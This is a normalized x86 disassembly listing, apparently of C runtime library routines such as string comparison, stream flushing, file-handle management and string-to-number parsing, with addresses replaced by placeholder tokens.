movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_42941d
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_42941d
add esp 0x10
inc esi
test edi edi
je r-xdata
sub_429e64
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_429da4
add esp 0xc
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
mov eax 0x7fffffff
pop ebp
retn
pop ebp
jmp sub_429d6b
sub_429ec1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
push ebx
push esi
push edi
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_41b9dc
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edi 0x7fffffff
cmp [ ebp + 0x10 ] edi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub ebx esi
push [ ebp + 0x10 ]
push esi
push ebx
call sub_42c6a0
add esp 0xc
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub edi eax
mov eax edi
jmp r-xdata
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp edi eax
je r-xdata
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_42941d
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_42941d
add esp 0x10
inc esi
dec [ ebp + 0x10 ]
je r-xdata
sub_429fa3
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_429ec1
add esp 0x10
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
mov eax 0x7fffffff
pop ebp
retn
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop ebp
jmp sub_42c6a0
sub_429ff6
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
jl r-xdata
call sub_41c34a
mov [ eax ] 0x9
call sub_41c35d
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x1
je r-xdata
cmp [ eax + esi ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_42a07c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_41c35d
and [ eax ] 0x0
call sub_41c34a
mov [ eax ] 0x9
call sub_41c35d
and [ eax ] 0x0
call sub_41c34a
mov [ eax ] 0x9
call sub_41efd5
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
or eax 0xffffffff
pop ebp
retn
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_42a0e5
push 0xc
push r--data
call sub_421220
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_4251cf
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_421265
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42a17b
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_42a184
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_42a1ab
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_42c701
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_42a1ed
push 0x10
push r--data
call sub_421220
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_4251cf
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42a280
mov eax [ ebp - 0x1c ]
call sub_421265
retn
mov esi edi
mov eax [ rw-data ]
cmp [ eax + esi * 4 ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_42c7a4
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_41a7eb
pop ecx
mov eax [ rw-data ]
mov [ eax + esi * 4 ] ebx
inc [ ebp - 0x1c ]
sub_42a289
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_428620
pop ecx
push eax
call sub_4282f8
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_42a2f1
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_42a289
pop ecx
test eax eax
je r-xdata
push esi
call sub_42a339
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_428620
push eax
call sub_42c818
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_42a339
push 0x14
push r--data
call sub_421220
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_4251cf
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42a40a
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_421265
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_428583
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_42a3db
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_42a2f1
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_42a2f1
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_42a41c
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
call sub_41b9dc
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
test eax eax
je r-xdata
test esi esi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
cmp [ ebp - 0x10 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x1c ]
push ebx
mov bl [ esi ]
push edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x1c ]
push eax
movzx eax bl
push 0x8
push eax
call sub_423b1c
mov ecx [ ebp - 0x1c ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
js r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
mov esi [ ecx + 0xc8 ]
mov [ ebp - 0x8 ] edx
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
and ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
lea ecx [ ebx - 0x61 ]
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
mov bl [ edi + 0x1 ]
add edi 0x2
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_41c34a
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
imul edx [ ebp + 0x14 ]
add edx ecx
mov [ ebp - 0x4 ] edx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
mov edx ecx
and edx 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0x8 ]
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
pop edi
pop ebx
sub_42a647
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_42a41c
add esp 0x14
pop ebp
retn
sub_42a672
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x38 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp - 0x24 ] 0x0
push esi
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ rw-data ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x30 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x30 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x38 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x10 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_41ac09
leave
retn
mov ecx [ ebp - 0x34 ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x20 ] edi
mov edi [ ecx ]
cmp [ ebp - 0x20 ] edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
cmp ebx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
mov ecx eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x20 ] edx
jmp r-xdata
add ebx [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp - 0x24 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x20 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x20 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x24 ]
jns r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edi 0x1
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea eax [ esi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ esi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x30 ] eax
jns r-xdata
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
xor eax eax
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
mov ebx [ rw-data ]
add ebx [ rw-data ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x10 ]
mov [ ebp - 0x2c ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x2c ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0x30 ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
add eax edx
lea edx [ ecx + 0x1 ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
sub ecx 0x4
dec edx
jns r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_42abc3
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x38 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp - 0x24 ] 0x0
push esi
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ rw-data ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x30 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x30 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x38 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x10 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
